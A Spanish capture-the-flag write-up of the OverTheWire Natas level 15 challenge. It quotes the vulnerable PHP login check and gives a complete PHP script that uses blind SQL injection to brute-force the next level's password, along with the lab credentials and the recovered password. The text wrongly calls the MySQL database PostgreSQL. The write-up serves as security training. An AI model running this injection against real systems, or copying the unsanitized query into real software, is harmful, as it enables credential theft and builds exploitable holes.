Si inspeccionamos el HTML, que ahora que hay ingresar un usuario.
Obtenemos el código y notamos que el usuario se valida
en una base de datos PostgreSQL.

```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
```

Además, hay un comentario indicando el esquema de la base de datos:

```SQL
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

Debido a que solo obtendremos si existe o no una fila que coincida con nuestra
consulta, podemos utilizar `LIKE` para ir haciendo consultas incrementales,
obteniendo progresivamente información sobre la contraseña.

```SQL
SELECT * FROM users WHERE username="natas16" AND password LIKE BINARY "a";
```

Podemos armar un script que se encargue de realizar estas consultas hasta
obtener la contraseña final. Una pequeña optimización consiste en primero
obtener los caracteres utilizados en la contraseña, y luego obtener la
contraseña probando únicamente esos caracteres.

```php
$authorization = base64_encode("natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB");
$url = "http://natas15.natas.labs.overthewire.org/index.php?debug";
$valid = "This user exists.";

function verify($inyection)
{
    global $authorization;
    global $url;
    global $valid;

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n" .
                "Authorization: Basic $authorization\r\n",
            'method' => 'POST',
            'content' => http_build_query(['username' => $inyection]),
        ],
    ];

    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

    return str_contains($response, $valid);
}

function contains_inyection($substring)
{
    return "natas16\" AND password LIKE BINARY \"%$substring%";
}

function startwith_inyection($start)
{
    return "natas16\" AND password LIKE BINARY \"$start%";
}


function equals_inyection($password)
{
    return "natas16\" AND password LIKE BINARY \"$password";
}


$alphabet = array_merge(range('A', 'Z'), range('a', 'z'), range(0, 9));
$filtered = array();

echo "Filtering characters...\n\n";

foreach ($alphabet as $letter) {
    echo "- Checking $letter.";
    if (verify(contains_inyection($letter))) {
        echo " Contained!\n";
        $filtered[] = $letter;
    } else {
        echo "\n";
    }
}

echo "\nFiltered characters: " . join("", $filtered) . "\n";

echo "Bruteforcing password...\n\n";

$password = "";
while (!verify(equals_inyection($password))) {
    echo "Current password: $password\n";
    foreach ($filtered as $letter) {
        echo "- Checking $password$letter";
        if (verify(startwith_inyection($password . $letter))) {
            echo " - Correct!\n";
            $password .= $letter;
            break;
        } else {
            echo "\n";
        }
    }
}

echo "\nFinal password: $password\n";
```

Al ejecutarlo, obtendremos la contraseña para el usuario natas16 luego de un
rato.

```
$ php crack-natas15.php
...
...
Final password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
```

